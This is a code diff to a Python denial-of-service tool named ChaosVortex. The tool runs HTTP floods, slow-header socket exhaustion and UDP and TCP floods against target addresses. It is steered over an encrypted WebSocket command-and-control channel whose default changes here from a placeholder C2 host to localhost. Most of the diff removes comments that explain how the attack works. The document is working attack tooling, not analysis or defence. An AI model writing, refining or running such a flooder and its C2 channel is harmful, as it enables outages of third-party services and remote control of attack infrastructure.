@@ -12,7 +12,7 @@ import base64
 import json
 import websocket
 import zlib
-from typing import List
+from typing import List, Dict
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import serialization, hashes
@@ -34,14 +34,14 @@ class ChaosVortex:
         self.threads = max(1, min(threads, 60))
         self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
         self.end_time = time.time() + duration
-        self.c2_url = c2_url or "wss://example-c2-websocket.com"  # Ganti dengan C2 asli
+        self.c2_url = c2_url or "ws://localhost:8765"  # Local C2 server
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
             "curl/8.4.0",
             "Mozilla/5.0 (Android 14; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0"
         ]
-        self.success_count = {m: {"total": 0, "impact": 0} for m in self.methods}  # Track 429/503
+        self.success_count = {m: {"total": 0, "impact": 0} for m in self.methods}
         self.response_times = {m: [] for m in ["vortexhttp", "ghostloris"]}
         self.lock = threading.Lock()
         self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
@@ -51,7 +51,7 @@ class ChaosVortex:
         self.c2_nonce = 0
         self.target_pools = {"l7": [], "l4": []}
         self.thread_pool = []
-        self.method_load = {m: 0.0 for m in self.methods}  # Load balancing
+        self.method_load = {m: 0.0 for m in self.methods}
 
     def _init_c2_session(self):
         """ECDH with HKDF, HMAC, and persistent reconnect."""
@@ -75,8 +75,8 @@ class ChaosVortex:
                     backend=default_backend()
                 )
                 derived_key = hkdf.derive(shared_secret)
-                self.shared_key = derived_key[:32]  # AES-256
-                self.hmac_key = derived_key[32:]   # HMAC-SHA256
+                self.shared_key = derived_key[:32]
+                self.hmac_key = derived_key[32:]
                 self.c2_session = ws
                 log_buffer.append({"ts": time.time(), "level": "INFO", "msg": "C2 session established"})
                 return True
@@ -87,13 +87,13 @@ class ChaosVortex:
 
     def _sign_command(self, data: bytes) -> bytes:
         """HMAC command signature."""
-        hmac = HMAC(self.hmac_key, hashes.SHA256(), backend=default_backend())
+        hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         return hmac.finalize()
 
     def _verify_command(self, data: bytes, signature: bytes) -> bool:
         """Verify HMAC signature."""
-        hmac = HMAC(self.hmac_key, hashes.SHA256(), backend=default_backend())
+        hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
         hmac.update(data)
         try:
             hmac.verify(signature)
@@ -106,7 +106,7 @@ class ChaosVortex:
         compressed = zlib.compress(data)
         iv = os.urandom(12)
         self.c2_nonce = (self.c2_nonce + 1) % (2**64)
-        nonce_bytes = self.c2_nonce.to_bytes(12, "big")  # 12-byte nonce
+        nonce_bytes = self.c2_nonce.to_bytes(12, "big")
         cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv), backend=default_backend())
         encryptor = cipher.encryptor()
         encryptor.authenticate_additional_data(nonce_bytes)
@@ -145,7 +145,7 @@ class ChaosVortex:
         valid_prefixes = [
             b"GET / HTTP/1.1\r\nHost: ",
             b"POST /api/data HTTP/1.1\r\nContent-Length: ",
-            b"\x00\x01\x02\x03"  # UDP-like protocol header
+            b"\x00\x01\x02\x03"
         ]
         prefix = random.choice(valid_prefixes)
         suffix = os.urandom(max(0, size - len(prefix)))
@@ -239,7 +239,7 @@ class ChaosVortex:
                 context.minimum_version = ssl.TLSVersion.TLSv1_2
                 sock = context.wrap_socket(sock, server_hostname=target)
                 sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {target}\r\n".encode())
-                time.sleep(random.uniform(0.05, 0.2))  # Exhaust sockets
+                time.sleep(random.uniform(0.05, 0.2))
                 sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                 time.sleep(random.uniform(0.1, 0.4))
                 sock.send(b"Connection: keep-alive\r\n\r\n")
@@ -265,7 +265,7 @@ class ChaosVortex:
                 ports = [80, 443]
                 port = random.choice(ports)
                 payload = self._random_payload(96)
-                for _ in range(4):  # Emulate fragmentation
+                for _ in range(4):
                     sock.sendto(payload[:len(payload)//4], (target, port))
                 with self.lock:
                     self.success_count["udpvortex"]["total"] += 1
@@ -341,7 +341,7 @@ class ChaosVortex:
                 t.start()
             for t in threads:
                 t.join(timeout=1.0)
-            time.sleep(0.1)  # Rebalance interval
+            time.sleep(0.1)
         avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
         log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}"})
         if self.c2_session:
@@ -379,6 +379,6 @@ if __name__ == "__main__":
     parser.add_argument("targets_l4", nargs="?", default=None, help="Comma-separated L4 targets (e.g., 93.184.216.34)")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
     parser.add_argument("--methods", type=str, default="vortexhttp,ghostloris,udpvortex,tcpvortex", help="Comma-separated methods")
-    parser.add_argument("--c2-url", type=str, default="wss://example-c2-websocket.com", help="WebSocket C2 URL")
+    parser.add_argument("--c2-url", type=str, default="ws://localhost:8765", help="WebSocket C2 URL")
     args = parser.parse_args()
     main(args.targets_l7, args.targets_l4, args.duration, args.methods, args.c2_url)
